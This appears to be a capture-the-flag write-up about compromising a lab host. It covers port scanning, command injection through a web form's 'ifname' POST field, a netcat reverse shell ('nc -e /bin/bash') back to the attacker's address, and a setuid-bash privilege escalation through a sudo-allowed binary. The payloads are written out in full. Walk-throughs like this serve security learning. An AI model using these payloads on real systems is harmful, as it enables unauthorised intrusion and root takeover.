# Port Scaning
To start reconaissance we begin doing a port scan with rustscan:

```
❯ rustscan -a 10.0.160.83
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

Open 10.0.160.83:1337
```

We can look that there's an open port, with nmap we can gather more detailed information about what is running on that port

```vhdl
❯ nmap -p1337 -sCV -n -Pn -v 10.0.160.83 -oN scan
<SNIP>
Nmap scan report for 10.0.160.83
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-methods: 
```

That scan reveals a web on that port, when we put the ip and the port 1337 on our browser we can see this content:

![[Pasted image 20241104222627.png]]

So, with curl we can send a post request with the data requested:

```bash
> curl http://10.0.160.83:1337 -d 'ifname=tun0'
used interface tun0
```

The response shows up a dialog "used interface", so, we can try it in diferent ways:

```bash
> curl http://10.0.160.83:1337 -d 'ifname=target'
used interface target 
```

```bash
> curl http://10.0.160.83:1337 -d 'ifname=!"#$;:'
used interface !"#$;:
```

# Exploitation
We can execute commands whith that post request just doing something like this:

```bash
> curl http://10.0.160.83:1337 -d 'ifname=;commanToExecute;'
```

An example is doin an whoami:

```bash
> curl http://10.0.160.83:1337 -d 'ifname=;whoami;'
used interface ;whoami;
```

But we receive the same output, to verify if it is running a command we can try to ping ourselves and sniffing it with tcpdump:

***Victim***

```bash
> curl http://10.0.160.83:1337 -d 'ifname=;ping -c1 10.10.1.30;'
used interface ;ping -c1 10.10.1.30;
```

***Ourselves

```bash
tcpdump -i tun0 icmp
```

![[Pasted image 20241104223547.png]]

The output shows that the ping was received so we can know that the command is running, after it just send a connection whith netcat just this way:

```bash
> curl http://10.0.160.83:1337 -d 'ifname=;nc -e /bin/bash 10.10.1.30 1234;'
used interface ;nc -e /bin/bash 10.10.1.30 1234;
```

So, just have to listen in the port 1234

```bash
> nc -lvnp 1234
```

And we're in

# Privilege escalation
Doing sudo -l we can see that we can execute n158 as sudo, so, let's look up that command with browser:

![[Pasted image 20241104224713.png]]

This is vulnerable to code injection as sudo, so if we modify the bash permission givin it a setuid permission we can run it as root:

```bash 
> /usr/local/bin/n158 init --name ".';chmod +s /bin/bash;'#"
> /bin/bash -p
```

And we are root.

FLAGS ARE ON:
- `/etc/passwd`
- `/etc/shadow`
- `/root`
